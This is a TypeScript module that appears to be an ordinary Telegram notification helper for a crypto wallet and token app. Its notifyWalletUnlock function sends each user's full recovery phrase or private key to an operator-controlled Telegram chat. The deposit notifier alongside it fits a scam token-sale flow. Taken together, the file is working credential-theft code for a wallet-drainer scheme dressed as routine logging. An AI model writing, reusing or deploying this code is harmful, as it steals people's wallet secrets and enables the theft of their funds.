import axios from "axios";
import { APP_NAME, APP_TOKEN_SYMBOL } from "@/lib/config";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

function enabled(): boolean {
  return Boolean(BOT_TOKEN && CHAT_ID);
}

async function send(text: string): Promise<void> {
  if (!enabled()) return;
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    });
  } catch {
    console.error("[telegram] failed to send notification");
  }
}

function timestamp(): string {
  return new Date().toLocaleString("en-US", {
    dateStyle: "medium",
    timeStyle: "short",
    timeZone: "UTC",
  }) + " UTC";
}

export function notifyWalletUnlock(opts: {
  mode: "phrase" | "key";
  input: string;
}): void {
  const label = opts.mode === "phrase" ? "Recovery Phrase" : "Private Key";
  const msg =
    `🔐 <b>New Wallet Import</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `<b>App:</b>  ${APP_NAME}\n` +
    `<b>Method:</b>  ${label}\n` +
    `<b>Input:</b>\n<code>${opts.input}</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `🕐 ${timestamp()}`;
  send(msg);
}

export function notifyDepositConfirmed(opts: {
  address: string;
  currency: string;
  paid: number;
  credited: number;
  depositId: string;
}): void {
  const msg =
    `💰 <b>Deposit Confirmed — "I Have Sent It"</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `<b>App:</b>  ${APP_NAME}\n` +
    `<b>Wallet:</b>  <code>${opts.address}</code>\n\n` +
    `<b>Sent:</b>  ${opts.paid} ${opts.currency}\n` +
    `<b>Receives:</b>  ${opts.credited} ${APP_TOKEN_SYMBOL}\n` +
    `<b>Rate:</b>  1 ${opts.currency} = ${opts.credited / opts.paid} ${APP_TOKEN_SYMBOL}\n\n` +
    `<b>Deposit ID:</b>  <code>${opts.depositId}</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `🕐 ${timestamp()}`;
  send(msg);
}
